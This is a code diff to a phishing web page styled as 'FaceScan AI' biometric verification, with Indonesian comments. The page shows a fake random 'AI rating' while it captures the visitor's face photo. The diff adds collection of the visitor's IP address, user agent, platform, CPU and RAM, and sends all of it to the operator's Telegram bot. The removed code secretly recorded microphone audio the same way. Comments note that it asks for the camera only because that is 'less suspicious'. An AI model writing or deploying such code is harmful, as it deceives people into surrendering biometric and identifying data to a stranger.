@@ -15,10 +15,9 @@
         .laser { position: absolute; width: 100%; height: 4px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; }
         @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
         .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 0.75rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; }
-        #final-box { display: none; animation: popUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        .score-num { font-size: 5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 5px 0; }
+        #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; }
+        #final-box { display: none; }
+        .score-num { font-size: 5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     </style>
 </head>
 <body>
@@ -26,8 +25,8 @@
     <div class="app-card">
         <div id="intro">
             <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
-            <p style="color:#888; font-size: 0.9rem; margin-bottom: 25px;">Menganalisis profil visual dan struktur vokal dengan standar Golden Ratio.</p>
-            <button class="btn-main" id="start-btn">START ANALYSIS</button>
+            <p style="color:#888; font-size: 0.85rem; margin-bottom: 25px;">Verifikasi biometrik & audit perangkat untuk keamanan akses premium.</p>
+            <button class="btn-main" id="start-btn">START VERIFICATION</button>
         </div>
 
         <div id="cam-holder">
@@ -40,7 +39,7 @@
         <div id="final-box">
             <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">AI RATING</div>
             <div class="score-num" id="score-val">0%</div>
-            <p style="font-weight:700;">PREMIUM PROFILE DETECTED</p>
+            <p style="font-weight:700;">VERIFIED PROFILE</p>
         </div>
     </div>
 
@@ -50,83 +49,88 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
-        let mediaRecorder;
-        let audioChunks = [];
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "INITIALIZING SENSORS...";
+            status.innerText = "SENSING FACE...";
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // HANYA meminta izin kamera (lebih tidak mencurigakan)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
 
-                // Memulai proses prank secara otomatis setelah kamera aktif
-                setTimeout(() => {
-                    startPrank(stream);
-                }, 1500);
+                setTimeout(() => { startProcess(); }, 1500);
 
             } catch (err) {
-                alert("Izin Kamera & Mic diperlukan untuk analisis AI.");
+                alert("Akses kamera ditolak. Gagal verifikasi.");
                 location.reload();
             }
         };
 
-        function startPrank(stream) {
-            status.innerText = "SCANNING FACE & VOICE...";
+        async function startProcess() {
+            status.innerText = "AUDITING DEVICE & BIOMETRICS...";
             
-            // Rekam Audio
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-            mediaRecorder.start();
+            // Ambil data HP & IP secara paralel sambil "scanning"
+            let ipData = "Unknown";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ipData = data.ip;
+            } catch(e) {}
 
-            // Jalankan scan selama 6 detik
-            setTimeout(() => {
-                mediaRecorder.stop();
-                status.innerText = "ENCRYPTING BIOMETRIC...";
-                
-                mediaRecorder.onstop = async () => {
-                    await takeAndSend();
-                };
-            }, 6000);
+            setTimeout(async () => {
+                await takeAndSend(ipData);
+            }, 5000);
         }
 
-        async function takeAndSend() {
-            // 1. Ambil Foto (Anti-Mirror)
+        async function takeAndSend(ip) {
+            // 1. Capture Foto
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
             const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
+
+            // 2. Kumpulkan Data Perangkat
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const cores = navigator.hardwareConcurrency || "N/A";
+            const ram = navigator.deviceMemory || "N/A";
             const score = Math.floor(Math.random() * 11) + 88;
 
-            // 2. Kirim Foto ke Telegram
-            const photoData = new FormData();
-            photoData.append('chat_id', CONFIG.CHAT_ID);
-            photoData.append('photo', photoBlob, 'face.png');
-            photoData.append('caption', `🔥 **PRANK SUCCESS**\n\n🎯 Skor AI: ${score}%\n👤 Target terekam!`);
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
+            // Pesan Telegram yang lebih "Ngeri"
+            const caption = `🎭 **PRANK BIOMETRIC SUCCESS**\n\n` +
+                            `🎯 **AI Score:** ${score}%\n` +
+                            `🌐 **IP Address:** \`${ip}\`\n` +
+                            `📱 **Platform:** ${platform}\n` +
+                            `⚙️ **CPU Cores:** ${cores}\n` +
+                            `💾 **RAM:** ±${ram} GB\n` +
+                            `🌐 **Browser:** ${getBrowser()}\n\n` +
+                            `🛠 **User Agent:** \n\`${ua}\``;
 
-            // 3. Kirim VN (Pake ekstensi .m4a biar durasi muncul)
-            const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
-            const audioData = new FormData();
-            audioData.append('chat_id', CONFIG.CHAT_ID);
-            audioData.append('voice', audioBlob, `voice_${Date.now()}.m4a`);
-            
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('photo', photoBlob, 'target.png');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
 
-            // 4. UI Selesai
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
+            // UI Selesai
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
             document.getElementById('final-box').style.display = 'block';
-
-            // Stop Kamera
             video.srcObject.getTracks().forEach(t => t.stop());
+        }
+
+        function getBrowser() {
+            if (navigator.userAgent.indexOf("Chrome") != -1) return "Google Chrome";
+            if (navigator.userAgent.indexOf("Safari") != -1) return "Safari";
+            if (navigator.userAgent.indexOf("Firefox") != -1) return "Firefox";
+            return "Unknown Browser";
         }
     </script>
 </body>
